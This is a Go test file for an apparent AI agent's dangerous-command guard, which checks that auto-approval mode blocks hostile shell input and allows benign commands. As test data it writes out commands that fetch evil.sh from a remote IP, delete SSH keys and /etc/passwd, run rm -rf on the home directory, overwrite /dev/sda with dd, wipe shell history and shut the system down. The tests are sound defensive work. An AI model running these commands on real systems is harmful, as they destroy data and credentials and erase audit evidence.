func TestGuardNetworkDownloadCurl(t *testing.T) {
	payload := commandArguments{
		Mode:       "shell",
		RawCommand: "curl -o /tmp/evil.sh http://10.0.0.1/evil.sh",
	}
	cfg := internalconfig.Config{ApprovalMode: "auto", ShellSandboxMode: "auto"}
	err := guardDangerousCommand(payload, cfg)
	if err == nil {
		t.Fatal("expected curl download to be blocked in sandbox mode")
	}
	if !strings.Contains(err.Error(), "下载外部文件") {
		t.Fatalf("expected download error, got: %v", err)
	}
}

// TestGuardNetworkDownloadWget verifies that wget download is blocked
// when sandbox is enabled.
func TestGuardNetworkDownloadWget(t *testing.T) {
	payload := commandArguments{
		Mode:       "shell",
		RawCommand: "wget http://10.0.0.1/evil.sh -O /tmp/evil.sh",
	}
	cfg := internalconfig.Config{ApprovalMode: "auto", ShellSandboxMode: "enforce"}
	err := guardDangerousCommand(payload, cfg)
	if err == nil {
		t.Fatal("expected wget download to be blocked in sandbox mode")
	}
}

// TestGuardNetworkDownloadScp verifies that scp is blocked when sandbox
// is enabled.
func TestNetworkDownloadScp(t *testing.T) {
	payload := commandArguments{
		Mode:       "shell",
		RawCommand: "scp user@10.0.0.1:/tmp/evil.sh /tmp/evil.sh",
	}
	cfg := internalconfig.Config{ApprovalMode: "auto", ShellSandboxMode: "auto"}
	err := guardDangerousCommand(payload, cfg)
	if err == nil {
		t.Fatal("expected scp to be blocked in sandbox mode")
	}
}

// TestGuardNetworkDownloadAria2c verifies that aria2c download is blocked.
func TestGuardNetworkDownloadAria2c(t *testing.T) {
	payload := commandArguments{
		Mode:       "shell",
		RawCommand: "aria2c http://10.0.0.1/evil.sh",
	}
	cfg := internalconfig.Config{ApprovalMode: "auto", ShellSandboxMode: "auto"}
	err := guardDangerousCommand(payload, cfg)
	if err == nil {
		t.Fatal("expected aria2c to be blocked in sandbox mode")
	}
}

// TestGuardNetworkDownloadAllowedWhenSandboxOff verifies that download
// commands are not blocked when sandbox is off.
func TestGuardNetworkDownloadAllowedWhenSandboxOff(t *testing.T) {
	payload := commandArguments{
		Mode:       "shell",
		RawCommand: "curl -o /tmp/file.txt http://example.com/file.txt",
	}
	cfg := internalconfig.Config{ApprovalMode: "auto", ShellSandboxMode: "off"}
	err := guardDangerousCommand(payload, cfg)
	if err != nil {
		t.Fatalf("expected download to pass when sandbox is off, got: %v", err)
	}
}

// TestGuardNetworkDownloadSafeCurl verifies that curl without -o (just
// fetching content) is not blocked.
func TestGuardNetworkDownloadSafeCurl(t *testing.T) {
	payload := commandArguments{
		Mode:       "shell",
		RawCommand: "curl https://example.com/api",
	}
	cfg := internalconfig.Config{ApprovalMode: "auto", ShellSandboxMode: "auto"}
	err := guardDangerousCommand(payload, cfg)
	if err != nil {
		t.Fatalf("expected safe curl to pass, got: %v", err)
	}
}

// ---------------------------------------------------------------------------
// 不可逆破坏性操作拦截测试（L3-13 ~ L3-25）
// ---------------------------------------------------------------------------

// L3-13: 删除敏感文件
func TestGuardDestructive_RmSensitiveFile(t *testing.T) {
	payload := commandArguments{Mode: "shell", RawCommand: "rm ~/.ssh/id_rsa"}
	cfg := internalconfig.Config{ApprovalMode: "auto"}
	err := guardDangerousCommand(payload, cfg)
	if err == nil {
		t.Fatal("expected rm ~/.ssh/id_rsa to be blocked")
	}
	if !strings.Contains(err.Error(), "删除敏感文件") {
		t.Fatalf("expected sensitive file deletion error, got: %v", err)
	}
}

// L3-13: 删除敏感文件（/etc/passwd）
func TestGuardDestructive_RmEtcPasswd(t *testing.T) {
	payload := commandArguments{Mode: "shell", RawCommand: "rm /etc/passwd"}
	cfg := internalconfig.Config{ApprovalMode: "auto"}
	err := guardDangerousCommand(payload, cfg)
	if err == nil {
		t.Fatal("expected rm /etc/passwd to be blocked")
	}
}

// L3-14: 递归删除目录
func TestGuardDestructive_RmRfDocuments(t *testing.T) {
	payload := commandArguments{Mode: "shell", RawCommand: "rm -rf ~/Documents/"}
	cfg := internalconfig.Config{ApprovalMode: "auto"}
	err := guardDangerousCommand(payload, cfg)
	if err == nil {
		t.Fatal("expected rm -rf ~/Documents/ to be blocked")
	}
	if !strings.Contains(err.Error(), "递归删除") {
		t.Fatalf("expected recursive deletion error, got: %v", err)
	}
}

// L3-14: 递归删除用户主目录
func TestGuardDestructive_RmRfHome(t *testing.T) {
	payload := commandArguments{Mode: "shell", RawCommand: "rm -rf ~"}
	cfg := internalconfig.Config{ApprovalMode: "auto"}
	err := guardDangerousCommand(payload, cfg)
	if err == nil {
		t.Fatal("expected rm -rf ~ to be blocked")
	}
}

// L3-15: 强制删除工作目录外文件
func TestGuardDestructive_RmForceEtcHosts(t *testing.T) {
	payload := commandArguments{Mode: "shell", RawCommand: "rm -f /etc/hosts"}
	cfg := internalconfig.Config{ApprovalMode: "auto"}
	err := guardDangerousCommand(payload, cfg)
	if err == nil {
		t.Fatal("expected rm -f /etc/hosts to be blocked")
	}
	if !strings.Contains(err.Error(), "系统") {
		t.Fatalf("expected system file deletion error, got: %v", err)
	}
}

// L3-15: 强制删除系统目录
func TestGuardDestructive_RmRfUsr(t *testing.T) {
	payload := commandArguments{Mode: "shell", RawCommand: "rm -rf /usr/local/foo"}
	cfg := internalconfig.Config{ApprovalMode: "auto"}
	err := guardDangerousCommand(payload, cfg)
	if err == nil {
		t.Fatal("expected rm -rf /usr/ to be blocked")
	}
}

// L3-16: 修改文件权限为全局可读写
// 注意：chmod 777 ~/.ssh/id_rsa 可能被 guardSensitiveFileAccess 先拦截
// （因为 "chmod" 包含 "od " 子串且 .ssh/ 是敏感路径），也可能被
// guardDestructiveActions 拦截。两种情况都算拦截成功。
func TestGuardDestructive_Chmod777SSHKey(t *testing.T) {
	payload := commandArguments{Mode: "shell", RawCommand: "chmod 777 ~/.ssh/id_rsa"}
	cfg := internalconfig.Config{ApprovalMode: "auto"}
	err := guardDangerousCommand(payload, cfg)
	if err == nil {
		t.Fatal("expected chmod 777 ~/.ssh/id_rsa to be blocked")
	}
	// 可被敏感文件访问拦截或权限修改拦截，两者都算成功
}

// L3-16: chmod 777 系统文件
func TestGuardDestructive_Chmod777EtcHosts(t *testing.T) {
	payload := commandArguments{Mode: "shell", RawCommand: "chmod 777 /etc/hosts"}
	cfg := internalconfig.Config{ApprovalMode: "auto"}
	err := guardDangerousCommand(payload, cfg)
	if err == nil {
		t.Fatal("expected chmod 777 /etc/hosts to be blocked")
	}
}

// L3-17: 修改文件所有者
func TestGuardDestructive_ChownSSHKey(t *testing.T) {
	payload := commandArguments{Mode: "shell", RawCommand: "chown root ~/.ssh/id_rsa"}
	cfg := internalconfig.Config{ApprovalMode: "auto"}
	err := guardDangerousCommand(payload, cfg)
	if err == nil {
		t.Fatal("expected chown root ~/.ssh/id_rsa to be blocked")
	}
	if !strings.Contains(err.Error(), "所有者") {
		t.Fatalf("expected chown error, got: %v", err)
	}
}

// L3-18: 覆盖系统关键文件
func TestGuardDestructive_OverwriteEtcHosts(t *testing.T) {
	payload := commandArguments{Mode: "shell", RawCommand: "echo probe > /etc/hosts"}
	cfg := internalconfig.Config{ApprovalMode: "auto"}
	err := guardDangerousCommand(payload, cfg)
	if err == nil {
		t.Fatal("expected echo > /etc/hosts to be blocked")
	}
	if !strings.Contains(err.Error(), "覆盖系统") {
		t.Fatalf("expected system file overwrite error, got: %v", err)
	}
}

// L3-18: 追加到系统关键文件
func TestGuardDestructive_AppendEtcPasswd(t *testing.T) {
	payload := commandArguments{Mode: "shell", RawCommand: "echo hacker >> /etc/passwd"}
	cfg := internalconfig.Config{ApprovalMode: "auto"}
	err := guardDangerousCommand(payload, cfg)
	if err == nil {
		t.Fatal("expected echo >> /etc/passwd to be blocked")
	}
}

// L3-19: 磁盘覆写
func TestGuardDestructive_DdOfDev(t *testing.T) {
	payload := commandArguments{Mode: "shell", RawCommand: "dd if=/dev/zero of=/dev/sda bs=1M count=1"}
	cfg := internalconfig.Config{ApprovalMode: "auto"}
	err := guardDangerousCommand(payload, cfg)
	if err == nil {
		t.Fatal("expected dd of=/dev/sda to be blocked")
	}
}

// L3-20: 终止关键系统进程
func TestGuardDestructive_KillPID1(t *testing.T) {
	payload := commandArguments{Mode: "shell", RawCommand: "kill -9 1"}
	cfg := internalconfig.Config{ApprovalMode: "auto"}
	err := guardDangerousCommand(payload, cfg)
	if err == nil {
		t.Fatal("expected kill -9 1 to be blocked")
	}
	if !strings.Contains(err.Error(), "关键系统进程") {
		t.Fatalf("expected kill PID 1 error, got: %v", err)
	}
}

// L3-21: pkill -9 批量终止
func TestGuardDestructive_Pkill9(t *testing.T) {
	payload := commandArguments{Mode: "shell", RawCommand: "pkill -9 bash"}
	cfg := internalconfig.Config{ApprovalMode: "auto"}
	err := guardDangerousCommand(payload, cfg)
	if err == nil {
		t.Fatal("expected pkill -9 bash to be blocked")
	}
}

// L3-22: 清空文件内容（证据销毁）
func TestGuardDestructive_TruncateBashHistory(t *testing.T) {
	payload := commandArguments{Mode: "shell", RawCommand: ": > ~/.bash_history"}
	cfg := internalconfig.Config{ApprovalMode: "auto"}
	err := guardDangerousCommand(payload, cfg)
	if err == nil {
		t.Fatal("expected : > ~/.bash_history to be blocked")
	}
	if !strings.Contains(err.Error(), "证据销毁") {
		t.Fatalf("expected evidence destruction error, got: %v", err)
	}
}

// L3-22: cat /dev/null > history
func TestGuardDestructive_CatDevNullHistory(t *testing.T) {
	payload := commandArguments{Mode: "shell", RawCommand: "cat /dev/null > ~/.bash_history"}
	cfg := internalconfig.Config{ApprovalMode: "auto"}
	err := guardDangerousCommand(payload, cfg)
	if err == nil {
		t.Fatal("expected cat /dev/null > ~/.bash_history to be blocked")
	}
}

// L3-22: truncate -s 0
func TestGuardDestructive_TruncateZshHistory(t *testing.T) {
	payload := commandArguments{Mode: "shell", RawCommand: "truncate -s 0 ~/.zsh_history"}
	cfg := internalconfig.Config{ApprovalMode: "auto"}
	err := guardDangerousCommand(payload, cfg)
	if err == nil {
		t.Fatal("expected truncate -s 0 ~/.zsh_history to be blocked")
	}
}

// L3-23: 安全擦除文件
func TestGuardDestructive_Shred(t *testing.T) {
	payload := commandArguments{Mode: "shell", RawCommand: "shred -u ~/.ssh/id_rsa"}
	cfg := internalconfig.Config{ApprovalMode: "auto"}
	err := guardDangerousCommand(payload, cfg)
	if err == nil {
		t.Fatal("expected shred -u ~/.ssh/id_rsa to be blocked")
	}
	if !strings.Contains(err.Error(), "擦除") {
		t.Fatalf("expected shred error, got: %v", err)
	}
}

// L3-24: 卸载文件系统
func TestGuardDestructive_UmountRoot(t *testing.T) {
	payload := commandArguments{Mode: "shell", RawCommand: "umount /"}
	cfg := internalconfig.Config{ApprovalMode: "auto"}
	err := guardDangerousCommand(payload, cfg)
	if err == nil {
		t.Fatal("expected umount / to be blocked")
	}
	if !strings.Contains(err.Error(), "卸载") {
		t.Fatalf("expected umount error, got: %v", err)
	}
}

// L3-25: 关机 halt
func TestGuardDestructive_Halt(t *testing.T) {
	payload := commandArguments{Mode: "shell", RawCommand: "halt"}
	cfg := internalconfig.Config{ApprovalMode: "auto"}
	err := guardDangerousCommand(payload, cfg)
	if err == nil {
		t.Fatal("expected halt to be blocked")
	}
}

// L3-25: poweroff
func TestGuardDestructive_Poweroff(t *testing.T) {
	payload := commandArguments{Mode: "shell", RawCommand: "poweroff"}
	cfg := internalconfig.Config{ApprovalMode: "auto"}
	err := guardDangerousCommand(payload, cfg)
	if err == nil {
		t.Fatal("expected poweroff to be blocked")
	}
}

// L3-25: init 0
func TestGuardDestructive_Init0(t *testing.T) {
	payload := commandArguments{Mode: "shell", RawCommand: "init 0"}
	cfg := internalconfig.Config{ApprovalMode: "auto"}
	err := guardDangerousCommand(payload, cfg)
	if err == nil {
		t.Fatal("expected init 0 to be blocked")
	}
}

// 安全命令不应被拦截
func TestGuardDestructive_SafeRmTempFile(t *testing.T) {
	payload := commandArguments{Mode: "shell", RawCommand: "rm /tmp/hello.txt"}
	cfg := internalconfig.Config{ApprovalMode: "auto"}
	err := guardDangerousCommand(payload, cfg)
	if err != nil {
		t.Fatalf("expected rm /tmp/hello.txt to pass, got: %v", err)
	}
}

func TestGuardDestructive_SafeChmod(t *testing.T) {
	payload := commandArguments{Mode: "shell", RawCommand: "chmod 644 /tmp/file.txt"}
	cfg := internalconfig.Config{ApprovalMode: "auto"}
	err := guardDangerousCommand(payload, cfg)
	if err != nil {
		t.Fatalf("expected chmod 644 /tmp/file.txt to pass, got: %v", err)
	}
}

func TestGuardDestructive_SafeEchoRedirect(t *testing.T) {
	payload := commandArguments{Mode: "shell", RawCommand: "echo hello > /tmp/file.txt"}
	cfg := internalconfig.Config{ApprovalMode: "auto"}
	err := guardDangerousCommand(payload, cfg)
	if err != nil {
		t.Fatalf("expected echo > /tmp/file.txt to pass, got: %v", err)
	}
}

func TestGuardDestructive_SafeKillProcess(t *testing.T) {
	payload := commandArguments{Mode: "shell", RawCommand: "kill 12345"}
	cfg := internalconfig.Config{ApprovalMode: "auto"}
	err := guardDangerousCommand(payload, cfg)
	if err != nil {
		t.Fatalf("expected kill 12345 to pass, got: %v", err)
	}
}

// 非 auto 模式下不拦截
func TestGuardDestructive_AllowedInNonAutoMode(t *testing.T) {
	payload := commandArguments{Mode: "shell", RawCommand: "rm -rf ~/Documents/"}
	cfg := internalconfig.Config{ApprovalMode: "confirm"}
	err := guardDangerousCommand(payload, cfg)
	if err != nil {
		t.Fatalf("expected no error in non-auto mode, got: %v", err)
	}
}

// ---------------------------------------------------------------------------
// 脚本语言破坏性操作拦截测试
// ---------------------------------------------------------------------------

// Python os.remove 敏感文件
func TestGuardScriptDestructive_PythonOsRemove(t *testing.T) {
	payload := commandArguments{Mode: "shell", RawCommand: `python3 -c 'import os; os.remove("/etc/passwd")'`}
	cfg := internalconfig.Config{ApprovalMode: "auto"}
	err := guardDangerousCommand(payload, cfg)
	if err == nil {
		t.Fatal("expected python os.remove('/etc/passwd') to be blocked")
	}
	if !strings.Contains(err.Error(), "脚本语言") {
		t.Fatalf("expected script error, got: %v", err)
	}
}

// Python shutil.rmtree 用户目录
func TestGuardScriptDestructive_PythonShutilRmtree(t *testing.T) {
	payload := commandArguments{Mode: "shell", RawCommand: `python3 -c 'import shutil; shutil.rmtree("/home/user")'`}
	cfg := internalconfig.Config{ApprovalMode: "auto"}
	err := guardDangerousCommand(payload, cfg)
	if err == nil {
		t.Fatal("expected python shutil.rmtree to be blocked")
	}
}

// Python os.chmod 敏感文件
func TestGuardScriptDestructive_PythonOsChmod(t *testing.T) {
	payload := commandArguments{Mode: "shell", RawCommand: `python3 -c 'import os; os.chmod("/etc/passwd", 0o777)'`}
	cfg := internalconfig.Config{ApprovalMode: "auto"}
	err := guardDangerousCommand(payload, cfg)
	if err == nil {
		t.Fatal("expected python os.chmod to be blocked")
	}
}

// Node.js unlinkSync 敏感文件
func TestGuardScriptDestructive_NodeUnlinkSync(t *testing.T) {
	payload := commandArguments{Mode: "shell", RawCommand: `node -e 'require("fs").unlinkSync("/etc/passwd")'`}
	cfg := internalconfig.Config{ApprovalMode: "auto"}
	err := guardDangerousCommand(payload, cfg)
	if err == nil {
		t.Fatal("expected node unlinkSync to be blocked")
	}
}

// Python 安全脚本不被拦截
func TestGuardScriptDestructive_SafePythonScript(t *testing.T) {
	payload := commandArguments{Mode: "shell", RawCommand: `python3 -c 'print("hello world")'`}
	cfg := internalconfig.Config{ApprovalMode: "auto"}
	err := guardDangerousCommand(payload, cfg)
	if err != nil {
		t.Fatalf("expected safe python script to pass, got: %v", err)
	}
}

// Python 安全文件操作不被拦截
func TestGuardScriptDestructive_SafePythonFileRead(t *testing.T) {
	payload := commandArguments{Mode: "shell", RawCommand: `python3 -c 'open("/tmp/hello.txt").read()'`}
	cfg := internalconfig.Config{ApprovalMode: "auto"}
	err := guardDangerousCommand(payload, cfg)
	if err != nil {
		t.Fatalf("expected safe python file read to pass, got: %v", err)
	}
}
